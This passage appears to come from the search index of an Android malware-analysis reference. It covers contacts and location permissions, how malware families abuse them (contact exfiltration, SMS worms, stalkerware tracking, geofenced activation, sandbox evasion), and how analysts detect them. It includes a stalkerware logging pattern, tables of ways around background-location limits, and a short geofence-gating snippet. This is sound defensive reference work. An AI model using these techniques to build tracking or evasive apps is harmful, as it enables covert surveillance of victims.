String name = account.name;   // email address or username\n}\n</code></pre> <p>Returns account type and name (typically email address) for all accounts on the device.</p>"},{"location":"permissions/contacts/get-accounts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/get-accounts/#email-harvesting","title":"Email Harvesting","text":"<p>Extract email addresses associated with device accounts. These are confirmed valid addresses tied to a real person.</p>"},{"location":"permissions/contacts/get-accounts/#service-identification","title":"Service Identification","text":"<p>Account types reveal which services the user uses: Google, Microsoft Exchange (corporate), Samsung, Facebook, banking apps with account integration.</p>"},{"location":"permissions/contacts/get-accounts/#targeted-phishing","title":"Targeted Phishing","text":"<p>Knowing the exact email addresses allows crafting targeted phishing emails that reference the victim's actual account.</p>"},{"location":"permissions/contacts/get-accounts/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): became a runtime permission.</p> <p>Android 8.0 (API 26): <code>GET_ACCOUNTS</code> is no longer required for accessing accounts belonging to the same developer (same package signature). Apps can access their own accounts without this permission.</p> <p>Android 11+: <code>GET_ACCOUNTS</code> provides limited data. Many account types restrict visibility to protect user privacy.</p>"},{"location":"permissions/contacts/get-accounts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.GET_ACCOUNTS\" /&gt;\n</code></pre> <p>Decreasingly useful due to Android restrictions. Modern malware uses other methods for account enumeration.</p>"},{"location":"permissions/contacts/read-contacts/","title":"READ_CONTACTS","text":"<p>Grants read access to the device's contact database via the Contacts content provider. Primary use in malware: bulk exfiltration of contact data for social graph mapping, building SMS worm target lists, and harvesting personal details for identity theft. FluBot famously used this to read all contacts and send phishing SMS to every number found.</p>"},{"location":"permissions/contacts/read-contacts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CONTACTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/read-contacts/#what-it-enables","title":"What It Enables","text":"<p>Access to the Contacts content provider at <code>content://com.android.contacts/</code>. The app can query all stored contacts and their associated data.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,\n    new String[]{\n        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,\n        ContactsContract.CommonDataKinds.Phone.NUMBER\n    },\n    null, null, null\n);\n</code></pre> <p>Data accessible per contact:</p> Field Content Display name Full contact name Phone numbers All stored numbers (mobile, work, home) Email addresses All associated emails Organization Company name, job title Postal address Physical addresses Notes Free-text notes field Photo Contact photo URI Groups Group membership (family, coworkers) Account Which account synced this contact (Google, Exchange) Last contacted Timestamp of last communication <p>The contact database is relational. A single query can join across tables to extract raw contacts, data rows, and aggregated contacts in bulk. The <code>ContactsContract.Data</code> table holds everything: phone numbers, emails, structured names, organizations, and custom MIME-typed data rows added by third-party apps.</p>"},{"location":"permissions/contacts/read-contacts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/read-contacts/#contact-exfiltration","title":"Contact Exfiltration","text":"<p>The most common abuse pattern. Malware dumps all contacts and sends them to C2. This provides:</p> <ul> <li>Personal details for identity theft</li> <li>Phone numbers and emails for phishing campaigns</li> <li>Organizational data for targeting corporate environments</li> </ul> <p>Exfiltration typically happens silently in a background service. The entire contacts database for an average user (hundreds of entries) is small enough to transmit in a single HTTP POST.</p>"},{"location":"permissions/contacts/read-contacts/#sms-worm-target-lists","title":"SMS Worm Target Lists","text":"<p>FluBot (2021-2022) was the most prominent example. After installation, it read all contacts and sent phishing SMS to every phone number, directing recipients to download the malware. This contact-to-SMS pipeline enabled exponential spreading across Europe and Australia.</p> <p>Other families using the same approach:</p> Family Contact Abuse FluBot Read all contacts, sent phishing SMS to each number. Explosive European spread. Medusa Contact harvesting for SMS-based spreading Anatsa Contact exfiltration to C2 for targeted campaigns Hydra Bulk contact dump for downstream phishing Anubis Contact theft combined with SMS interception Crocodilus Contact list injection: adds fake \"Bank Support\" entries SpyNote Full contact exfiltration as part of surveillance MoqHao Contact harvesting for smishing distribution SpyLoan Bulk contact theft, weaponized for harassment and extortion of borrowers Rafel RAT Contact exfiltration across 120+ campaigns"},{"location":"permissions/contacts/read-contacts/#social-graph-mapping","title":"Social Graph Mapping","text":"<p>Contacts reveal relationship structures. Malware or spyware operators can reconstruct who knows whom by correlating contacts across compromised devices. This is especially valuable in targeted surveillance operations where the objective is mapping an entire network, not just a single target.</p>"},{"location":"permissions/contacts/read-contacts/#targeted-phishing","title":"Targeted Phishing","text":"<p>With access to contact names, an attacker can craft SMS or email messages that appear to come from a known contact. Combining <code>READ_CONTACTS</code> with <code>SEND_SMS</code> allows sending messages that reference the target by name, dramatically increasing phishing success rates.</p>"},{"location":"permissions/contacts/read-contacts/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): runtime permission required. Prior to this, contacts access was granted at install time with no user interaction.</p> <p>Android 8.0 (API 26): granting <code>READ_CONTACTS</code> no longer automatically grants <code>GET_ACCOUNTS</code>. These were split into separate permissions, reducing the data exposed by a single grant.</p> <p>Android 11 (API 30): no functional changes, but the permissions auto-reset feature can revoke <code>READ_CONTACTS</code> for unused apps, limiting long-term passive collection.</p> <p>Android 15 (API 35): enhanced permission rationale requirements. The runtime dialog can show app-specific justification text.</p>"},{"location":"permissions/contacts/read-contacts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CONTACTS\" /&gt;\n</code></pre> <p>High-risk indicator when combined with:</p> <ul> <li><code>SEND_SMS</code>: SMS worm pattern (read contacts, send phishing)</li> <li><code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code>: background exfiltration with persistence</li> <li><code>READ_SMS</code> + <code>READ_CALL_LOG</code>: full communication surveillance</li> </ul> <p>Look for <code>ContentResolver.query()</code> calls targeting <code>ContactsContract</code> URIs in decompiled code. Bulk queries with no projection filtering (selecting all columns) suggest exfiltration rather than legitimate lookup. Background services or <code>WorkManager</code> tasks querying contacts without corresponding UI activity are strong indicators.</p>"},{"location":"permissions/contacts/write-contacts/","title":"WRITE_CONTACTS","text":"<p>Allows creating, modifying, and deleting contacts on the device. Can be used to inject contacts for social engineering or modify existing contacts to redirect calls/messages.</p>"},{"location":"permissions/contacts/write-contacts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CONTACTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/write-contacts/#what-it-enables","title":"What It Enables","text":"<p>Full write access to the <code>ContactsContract</code> content provider:</p> <ul> <li>Create new contacts</li> <li>Modify existing contact details (phone numbers, emails)</li> <li>Delete contacts</li> <li>Modify contact photos</li> </ul>"},{"location":"permissions/contacts/write-contacts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/write-contacts/#contact-poisoning","title":"Contact Poisoning","text":"<p>Modify a legitimate contact's phone number to redirect calls to an attacker-controlled number. When the victim calls \"their bank,\" they reach the attacker instead.</p>"},{"location":"permissions/contacts/write-contacts/#social-engineering-setup","title":"Social Engineering Setup","text":"<p>Inject a fake contact (e.g., \"Bank Security\" with the attacker's number) so that when the attacker calls, the victim sees a trusted name on caller ID.</p>"},{"location":"permissions/contacts/write-contacts/#evidence-destruction","title":"Evidence Destruction","text":"<p>Delete contacts to destroy evidence of communication or to disrupt the victim's phone.</p>"},{"location":"permissions/contacts/write-contacts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CONTACTS\" /&gt;\n</code></pre> <p>Less commonly requested than <code>READ_CONTACTS</code>. Any app requesting write access without clear contact management functionality is suspicious.</p>"},{"location":"permissions/location/","title":"Location Permissions","text":"<p>Location permissions expose the device's physical position through GPS, WiFi, cell tower triangulation, and fused providers. From an offense perspective, location data enables stalkerware tracking, spyware geolocation reporting, geofenced payload activation, and victim profiling.</p>"},{"location":"permissions/location/#permissions","title":"Permissions","text":"Permission Abuse Potential ACCESS_FINE_LOCATION GPS-precision tracking, stalkerware, geofence-triggered payloads ACCESS_COARSE_LOCATION Approximate location via network, city-level victim profiling ACCESS_BACKGROUND_LOCATION Continuous tracking without foreground UI, persistent stalkerware"},{"location":"permissions/location/#permission-model","title":"Permission Model","text":"<p>Android splits location into two axes: precision (fine vs coarse) and timing (foreground vs background).</p> <p>Precision: <code>ACCESS_FINE_LOCATION</code> provides GPS-level accuracy (within meters). <code>ACCESS_COARSE_LOCATION</code> uses WiFi and cell towers for approximately 1-2km accuracy. Since Android 12, users can downgrade a fine location request to approximate at grant time.</p> <p>Timing: Before Android 10, any location permission worked regardless of app state. Android 10 introduced <code>ACCESS_BACKGROUND_LOCATION</code> as a separate grant. Without it, an app only receives location updates while it has a visible activity or foreground service with the <code>location</code> type.</p> <p>Grant flow on Android 12+:</p> <ol> <li>App requests <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code></li> <li>User sees dialog with \"Precise\" / \"Approximate\" toggle</li> <li>User selects \"While using the app\" or \"Only this time\"</li> <li>Background location must be requested separately and directs the user to Settings</li> </ol>"},{"location":"permissions/location/#why-location-tracking-matters-for-malware","title":"Why Location Tracking Matters for Malware","text":""},{"location":"permissions/location/#stalkerware-and-spyware","title":"Stalkerware and Spyware","text":"<p>Location is the highest-value data point for stalkerware. Continuous GPS tracking reveals a target's home address, workplace, daily routine, and travel patterns. Commercial spyware (Pegasus, Predator) and consumer stalkerware (Cerberus, TheTruthSpy) both prioritize location collection. Many stalkerware families implement their own location polling loop using <code>FusedLocationProviderClient</code> to balance accuracy against battery drain.</p>"},{"location":"permissions/location/#geofenced-payload-activation","title":"Geofenced Payload Activation","text":"<p>Banking trojans and targeted implants use geofencing to activate only in specific countries or regions. The malware checks the victim's coordinates against a target area before deploying its overlay attacks or exfiltrating data. This avoids triggering sandbox analysis (most sandboxes report locations in the US or default to null island at 0,0) and limits exposure to researchers outside the target region.</p>"},{"location":"permissions/location/#victim-profiling","title":"Victim Profiling","text":"<p>Even coarse location data reveals which country and city the victim is in. Malware uses this to select the correct phishing overlay language, target the right banking apps, or decide whether to self-destruct to avoid analysis in non-target regions.</p>"},{"location":"permissions/location/#play-store-policy","title":"Play Store Policy","text":"<p>Google Play requires apps using background location to demonstrate core functionality that depends on it. Since 2020, apps must submit a declaration form and pass review. Most stalkerware and spyware distribute through sideloading, third-party stores, or MDM-based installation to bypass these restrictions.</p>"},{"location":"permissions/location/#bypass-techniques","title":"Bypass Techniques","text":"Technique How It Works Foreground service abuse Declare a <code>location</code>-type foreground service with a persistent notification to maintain foreground location access without <code>ACCESS_BACKGROUND_LOCATION</code> WorkManager polling Schedule periodic work that briefly requests location during execution windows AlarmManager wakeups Wake the app at intervals to grab a location fix before the system kills the process WiFi scan results Use <code>ACCESS_WIFI_STATE</code> to scan nearby access points and geolocate via public WiFi databases without location permission Cell tower info Read <code>TelephonyManager</code> cell info (requires <code>ACCESS_FINE_LOCATION</code> or <code>READ_PHONE_STATE</code> on older APIs) to triangulate position IP geolocation Query an external service to resolve the device's IP to an approximate location with no permissions at all"},{"location":"permissions/location/access-background-location/","title":"ACCESS_BACKGROUND_LOCATION","text":"<p>Allows an app to receive location updates when it has no visible activity or foreground service. This is the permission that separates passive location checks from persistent tracking. Critical for stalkerware, spyware, and any implant that needs to log the victim's movements continuously without user interaction.</p>"},{"location":"permissions/location/access-background-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_BACKGROUND_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Settings page redirect (Android 11+) or runtime dialog (Android 10) Introduced API 29 (Android 10)"},{"location":"permissions/location/access-background-location/#what-it-enables","title":"What It Enables","text":"<p>Without this permission, location updates are only delivered while the app has a visible activity or a foreground service with type <code>location</code>. With it, the app receives location updates regardless of its lifecycle state.</p> <p>Background location works through:</p> <ul> <li><code>FusedLocationProviderClient.requestLocationUpdates()</code> with a <code>PendingIntent</code> that fires even when the app is killed</li> <li><code>GeofencingClient.addGeofences()</code> for enter/exit/dwell triggers on geographic regions</li> <li><code>LocationManager.requestLocationUpdates()</code> targeting background delivery</li> <li><code>WorkManager</code> or <code>JobScheduler</code> tasks that read <code>getLastKnownLocation()</code> during execution</li> </ul> <p>The precision of background location depends on which foreground permission was granted:</p> Foreground Permission Background Result <code>ACCESS_FINE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> GPS-accuracy updates in background <code>ACCESS_COARSE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> Approximate updates in background <code>ACCESS_FINE_LOCATION</code> only (user chose approximate on Android 12+) Approximate updates in background"},{"location":"permissions/location/access-background-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-background-location/#persistent-stalkerware-tracking","title":"Persistent Stalkerware Tracking","text":"<p>This is the primary stalkerware permission. Without it, the app must maintain a visible foreground notification to keep tracking, which alerts the victim. With background location, tracking is invisible. The app registers a <code>PendingIntent</code>-based location request that survives app process death and continues to fire at configured intervals.</p> <p>Stalkerware logging pattern:</p> <ol> <li>Register <code>PendingIntent</code> for location updates every 5-15 minutes</li> <li><code>BroadcastReceiver</code> fires on each update</li> <li>Location is written to a local database</li> <li>Periodic sync job pushes accumulated locations to C2</li> <li>If the process is killed, the <code>PendingIntent</code> re-triggers it</li> </ol>"},{"location":"permissions/location/access-background-location/#geofence-based-payload-activation","title":"Geofence-Based Payload Activation","text":"<p>Advanced malware uses <code>GeofencingClient</code> with background location to trigger actions when the victim enters a specific area. Use cases:</p> <ul> <li>Banking trojan activates overlay attacks only when the device is in the target country</li> <li>Targeted implant begins full surveillance when the victim arrives at a location of interest</li> <li>Ransomware holds off deployment until the victim is in a jurisdiction where payment is likely</li> </ul> <p>Geofences survive app restart and process death, making them reliable persistent triggers.</p>"},{"location":"permissions/location/access-background-location/#continuous-intelligence-collection","title":"Continuous Intelligence Collection","text":"<p>Nation-state implants log location continuously to build movement profiles. The data reveals:</p> <ul> <li>Home and work addresses (most frequent nighttime and daytime locations)</li> <li>Daily routine and travel patterns</li> <li>Meetings with other tracked targets (co-location analysis)</li> <li>Travel to sensitive locations (government buildings, embassies, protest sites)</li> </ul>"},{"location":"permissions/location/access-background-location/#notable-families","title":"Notable Families","text":"Family Background Location Usage Pegasus (NSO Group) Continuous background GPS logging with encrypted exfiltration Predator (Cytrox) Background tracking tied to C2 tasking commands FlexiSPY Configurable background polling interval, route reconstruction TheTruthSpy Persistent background tracking marketed for \"partner monitoring\" Cerberus Background geofencing combined with overlay injection Monokle (STC) Background location as part of full surveillance toolkit PhoneSpy Background tracking with location history stored in local SQLite"},{"location":"permissions/location/access-background-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): <code>ACCESS_BACKGROUND_LOCATION</code> introduced. Apps targeting API 29+ must request it explicitly. The runtime dialog shows \"Allow all the time\" as an option when background location is requested alongside foreground location. Apps targeting API 28 or below automatically receive background access when granted foreground location (compatibility behavior).</p> <p>Android 11 (API 30): Incremental grants enforced. The system blocks requesting <code>ACCESS_BACKGROUND_LOCATION</code> in the same dialog as foreground permissions. The app must first obtain foreground location, then separately request background. The second request opens the app's Settings page where the user manually selects \"Allow all the time.\" This two-step flow significantly reduces the background location grant rate.</p> <p>Android 11 (API 30): Auto-revoke (hibernation) introduced. If the app is not used for several months, all permissions including background location are automatically revoked. Malware that hides its launcher icon may still have its permissions revoked.</p> <p>Android 12 (API 31): The approximate location toggle compounds the restriction. Even if background location is granted, the user may have selected approximate only, limiting background updates to coarse accuracy.</p> <p>Android 13 (API 33): Foreground service type enforcement tightened. Apps declaring <code>foregroundServiceType=\"location\"</code> must hold <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code>. This does not replace <code>ACCESS_BACKGROUND_LOCATION</code> but affects the foreground service workaround.</p> <p>Android 14 (API 34): Foreground service types are now mandatory. Apps must declare <code>foregroundServiceType</code> in the manifest and hold the corresponding permissions at runtime. The <code>location</code> type requires active location permissions.</p>"},{"location":"permissions/location/access-background-location/#workarounds-when-background-location-is-denied","title":"Workarounds When Background Location Is Denied","text":"Technique Mechanism Limitations Foreground service with notification Declare <code>foregroundServiceType=\"location\"</code> with a persistent notification Visible to user, can be dismissed on Android 13+ WorkManager periodic tasks Schedule recurring work that reads <code>getLastKnownLocation()</code> Subject to battery optimization, may get stale location AlarmManager + <code>setExactAndAllowWhileIdle()</code> Wake the app at exact intervals to grab location Doze mode limits frequency, gets killed quickly Push notification trigger FCM message triggers location read in message handler Brief execution window, unreliable for continuous tracking Companion device pairing Use <code>CompanionDeviceManager</code> to exempt from background restrictions Requires user interaction, device pairing step Accessibility service abuse Read location from other apps' UI or maintain process priority Requires accessibility grant, heavily scrutinized"},{"location":"permissions/location/access-background-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_BACKGROUND_LOCATION\" /&gt;\n</code></pre> <p>The presence of <code>ACCESS_BACKGROUND_LOCATION</code> in any app that is not a navigation, fitness tracking, or family safety app is a strong red flag.</p> <p>Key indicators during analysis:</p> Signal What to Look For Manifest <code>ACCESS_BACKGROUND_LOCATION</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>INTERNET</code> PendingIntent registration <code>requestLocationUpdates()</code> with <code>PendingIntent</code> instead of <code>LocationCallback</code> Geofence setup <code>addGeofences()</code> calls, especially with coordinates matching country boundaries Database storage Local SQLite tables storing latitude, longitude, timestamp, accuracy columns Service declarations <code>foregroundServiceType=\"location\"</code> combined with minimal or deceptive notification text Boot receiver <code>BroadcastReceiver</code> for <code>BOOT_COMPLETED</code> that re-registers location requests <p>Apps that request background location but have no visible mapping, navigation, or fitness UI are almost certainly collecting location for exfiltration. Cross-reference the requested permissions with the app's declared functionality to identify the mismatch.</p>"},{"location":"permissions/location/access-coarse-location/","title":"ACCESS_COARSE_LOCATION","text":"<p>Grants network-based approximate location with roughly 1-2km accuracy using WiFi access points and cell tower data. Less useful than fine location for stalkerware but sufficient for country/city-level victim profiling, geofenced payload activation, and sandbox evasion.</p>"},{"location":"permissions/location/access-coarse-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_COARSE_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/location/access-coarse-location/#what-it-enables","title":"What It Enables","text":"<p>Access to the network location provider (<code>LocationManager.NETWORK_PROVIDER</code>) and the fused provider at <code>PRIORITY_BALANCED_POWER_ACCURACY</code> or <code>PRIORITY_LOW_POWER</code>. Returns coordinates fuzzed to approximately a 1-2km radius around the actual position.</p> <pre><code>FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);\nclient.requestLocationUpdates(\n    new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 60000).build(),\n    locationCallback,\n    Looper.getMainLooper()\n);\n</code></pre> <p>With <code>ACCESS_COARSE_LOCATION</code>, an app can:</p> <ul> <li>Get network-derived position (WiFi + cell triangulation)</li> <li>Access WiFi scan results (since Android 8.1)</li> <li>Scan for BLE devices (<code>BluetoothLeScanner</code>)</li> <li>Detect nearby WiFi networks (<code>WifiManager.getScanResults()</code>)</li> <li>Use the <code>NETWORK_PROVIDER</code> in <code>LocationManager</code></li> </ul> <p>It cannot:</p> <ul> <li>Access the GPS provider directly</li> <li>Get accuracy better than approximately 1-2km through legitimate API calls</li> <li>Set up geofences (requires <code>ACCESS_FINE_LOCATION</code>)</li> </ul>"},{"location":"permissions/location/access-coarse-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-coarse-location/#fallback-location-strategy","title":"Fallback Location Strategy","text":"<p>Malware commonly requests both <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code>. If the user (on Android 12+) downgrades to approximate location, the malware still gets coarse data. Some families check the granted permission level and adjust their behavior, using coarse data for country-level decisions and deferring precision-dependent operations.</p>"},{"location":"permissions/location/access-coarse-location/#country-and-region-detection","title":"Country and Region Detection","text":"<p>Coarse location is sufficient for determining which country or city the victim is in. Banking trojans use this to:</p> <ul> <li>Select the right overlay injection target from their phishing kit</li> <li>Choose the correct language for social engineering prompts</li> <li>Decide whether to activate at all (avoid non-target regions)</li> <li>Report victim geography to C2 for campaign segmentation</li> </ul>"},{"location":"permissions/location/access-coarse-location/#sandbox-evasion","title":"Sandbox Evasion","text":"<p>Analysis sandboxes often return null or default coordinates (0.0, 0.0 or US-based locations). Checking for coarse location anomalies is a lightweight evasion technique. If the reported location does not match the device's MCC/MNC (mobile country/network codes from <code>TelephonyManager</code>), the malware assumes it is running in an analysis environment.</p>"},{"location":"permissions/location/access-coarse-location/#wifi-environment-fingerprinting","title":"WiFi Environment Fingerprinting","text":"<p>With <code>ACCESS_COARSE_LOCATION</code>, the app can call <code>WifiManager.getScanResults()</code> to enumerate all visible WiFi networks. This produces a fingerprint of the local RF environment:</p> <ul> <li>BSSID list reveals the physical location via public WiFi geolocation databases</li> <li>SSID names can identify corporate networks, government facilities, or specific targets</li> <li>Signal strength patterns create a unique fingerprint of the location even without coordinates</li> </ul>"},{"location":"permissions/location/access-coarse-location/#notable-families","title":"Notable Families","text":"Family Coarse Location Usage Joker Region check before activating premium SMS fraud Harly Country detection for subscription scam targeting GriftHorse Location-based selection of premium number to dial SharkBot Geographic filtering to target specific banking regions Xenomorph Coarse geofencing for overlay activation decisions"},{"location":"permissions/location/access-coarse-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Became a runtime permission. Before this, manifest declaration was sufficient.</p> <p>Android 8.0 (API 26): Background apps receive coarse location updates only a few times per hour due to background execution limits.</p> <p>Android 8.1 (API 27): WiFi scan results now require either <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code>. Previously only <code>ACCESS_WIFI_STATE</code> was needed.</p> <p>Android 10 (API 29): Background location access split out into <code>ACCESS_BACKGROUND_LOCATION</code>. Coarse location alone only works while the app is in the foreground or running a foreground service.</p> <p>Android 12 (API 31): The approximate location toggle changed the dynamic significantly. Apps requesting <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code> together show a dialog with a precision toggle. The user can grant only approximate location, which means the app effectively receives coarse-level data even though it requested fine. If an app requests only <code>ACCESS_COARSE_LOCATION</code>, the dialog has no precision toggle and grants approximate by default.</p> <p>Android 12 (API 31): <code>ACCESS_COARSE_LOCATION</code> returns coordinates fuzzed to a ~1.5km radius cell. The fuzzing is consistent for a period (the same approximate location is returned for the same cell), which means temporal correlation can still reveal movement patterns at city-block granularity.</p>"},{"location":"permissions/location/access-coarse-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" /&gt;\n</code></pre> <p>When <code>ACCESS_COARSE_LOCATION</code> appears without <code>ACCESS_FINE_LOCATION</code>, the app either legitimately needs only approximate data or is trying to reduce its permission footprint to avoid scrutiny. Many malware families request both, so a coarse-only request is less common and may indicate a more targeted approach.</p> <p>Watch for:</p> <ul> <li><code>ACCESS_COARSE_LOCATION</code> combined with <code>TelephonyManager</code> calls (MCC/MNC checks) for region-based payload selection</li> <li>WiFi scanning patterns that enumerate all nearby access points immediately after location grant</li> <li>Location checks followed by conditional code paths that exit or self-delete based on geographic result</li> <li>Network requests to IP geolocation APIs as a secondary location source alongside coarse permission</li> </ul>"},{"location":"permissions/location/access-fine-location/","title":"ACCESS_FINE_LOCATION","text":"<p>Grants GPS-precision location access (within ~3 meters) using GPS, GLONASS, WiFi positioning, cell tower triangulation, and the fused location provider. The single most valuable permission for stalkerware and a common request in banking trojans that use geofencing to activate in target regions.</p>"},{"location":"permissions/location/access-fine-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_FINE_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/location/access-fine-location/#what-it-enables","title":"What It Enables","text":"<p>Access to the <code>FusedLocationProviderClient</code> (Google Play Services) or the platform <code>LocationManager</code> for high-accuracy location updates.</p> <pre><code>FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);\nclient.requestLocationUpdates(\n    new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000).build(),\n    locationCallback,\n    Looper.getMainLooper()\n);\n</code></pre> <p>Available location sources:</p> Provider Accuracy Battery Cost Notes GPS (<code>gps</code>) ~3m High Requires clear sky view, slow cold start Network (<code>network</code>) ~30-100m Low WiFi + cell tower Fused (<code>fused</code>) ~3-100m Variable Google Play Services, balances accuracy vs battery Passive (<code>passive</code>) Varies None Piggybacks on other apps' location requests <p>With <code>ACCESS_FINE_LOCATION</code>, an app can:</p> <ul> <li>Request continuous GPS updates at arbitrary intervals</li> <li>Get last known location without waiting for a fix</li> <li>Set up geofences that trigger callbacks on region entry/exit</li> <li>Access WiFi scan results (required since Android 8.1 for <code>WifiManager.getScanResults()</code>)</li> <li>Read nearby BLE beacon data for indoor positioning</li> </ul>"},{"location":"permissions/location/access-fine-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-fine-location/#stalkerware-and-domestic-surveillance","title":"Stalkerware and Domestic Surveillance","text":"<p>Stalkerware families poll <code>FusedLocationProviderClient</code> at intervals between 1 and 15 minutes, logging each fix with timestamp, accuracy, speed, and bearing. Logs are exfiltrated to C2 or stored locally for later retrieval. Some families (FlexiSPY, mSpy, Cerberus) offer real-time location streaming to the operator's dashboard.</p>"},{"location":"permissions/location/access-fine-location/#geofenced-banking-trojans","title":"Geofenced Banking Trojans","text":"<p>Banking trojans like Anubis, Alien, and Ermac request fine location to determine if the device is in a target country. If the coordinates fall outside the target zone, the malware either stays dormant or uninstalls itself. This defeats sandbox analysis since emulators and analysis environments typically report default or US-based coordinates.</p> <pre><code>Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);\nif (loc != null &amp;&amp; isTargetCountry(loc.getLatitude(), loc.getLongitude())) {\n    activateOverlayAttacks();\n}\n</code></pre>"},{"location":"permissions/location/access-fine-location/#tracking-for-physical-operations","title":"Tracking for Physical Operations","text":"<p>Nation-state implants (FinFisher, Pegasus) use fine location to track the physical movements of targets. Location history combined with other sensor data (accelerometer, barometer) can reveal building floor, transportation mode, and whether the target is stationary or moving.</p>"},{"location":"permissions/location/access-fine-location/#notable-families","title":"Notable Families","text":"Family Location Usage Pegasus (NSO Group) Continuous GPS tracking, location history exfiltration Cerberus Real-time location streaming, geofenced activation Anubis Geofencing to avoid non-target regions and sandboxes FlexiSPY GPS polling with configurable intervals, route logging FurBall (APT-C-50) Periodic location collection for surveillance campaigns Hermit (RCS Lab) High-frequency location sampling tied to C2 tasking LightSpy Dedicated location plugin with configurable polling intervals EagleMsgSpy Real-time GPS tracking for law enforcement surveillance BoneSpy Location collection as part of Gamaredon-linked mobile surveillance PlainGnome GPS tracking in second-stage payload for targeted espionage GuardZoo Military GPS tracking, exfiltrates location data from armed forces personnel KoSpy Periodic location harvesting for North Korean intelligence collection AridSpy Location tracking in multi-stage spyware targeting Middle Eastern users"},{"location":"permissions/location/access-fine-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Location became a runtime permission. Prior to this, declaring it in the manifest was sufficient. Granting <code>ACCESS_FINE_LOCATION</code> implicitly granted <code>ACCESS_COARSE_LOCATION</code> (same permission group behavior).</p> <p>Android 8.0 (API 26): Background location throttled. Apps in the background receive location updates only a few times per hour. Foreground services bypass this throttle.</p> <p>Android 8.1 (API 27): <code>WifiManager.getScanResults()</code> now requires <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code> in addition to <code>ACCESS_WIFI_STATE</code>. WiFi-based location became tied to location permissions.</p> <p>Android 10 (API 29): Background location split into <code>ACCESS_BACKGROUND_LOCATION</code>. Apps targeting API 29+ must request it separately. Foreground-only location is the default. The permission dialog offers \"Allow all the time\" only if background location is also requested.</p> <p>Android 11 (API 30): Incremental location grants. The system forces a two-step flow: foreground first, then background via Settings. <code>ACCESS_BACKGROUND_LOCATION</code> cannot be requested alongside foreground permissions in the same dialog.</p> <p>Android 12 (API 31): Approximate location toggle. When an app requests <code>ACCESS_FINE_LOCATION</code>, the user can downgrade to approximate only. The system returns a location fuzzed to ~1.5km. Apps must request both <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code> to show the precision toggle. If only fine is requested, the system may deny entirely.</p> <p>Android 12 (API 31): New <code>currentLocation()</code> API as a one-shot alternative to <code>requestLocationUpdates()</code>. Intended to reduce persistent location access, but malware can still call it repeatedly.</p>"},{"location":"permissions/location/access-fine-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt;\n</code></pre> <p>High-risk combinations:</p> Combination Indicates <code>ACCESS_FINE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> + <code>INTERNET</code> Continuous location exfiltration <code>ACCESS_FINE_LOCATION</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> Persistent tracking surviving reboot <code>ACCESS_FINE_LOCATION</code> + <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>READ_SMS</code> Full surveillance suite (stalkerware) <code>ACCESS_FINE_LOCATION</code> alone with overlay permissions 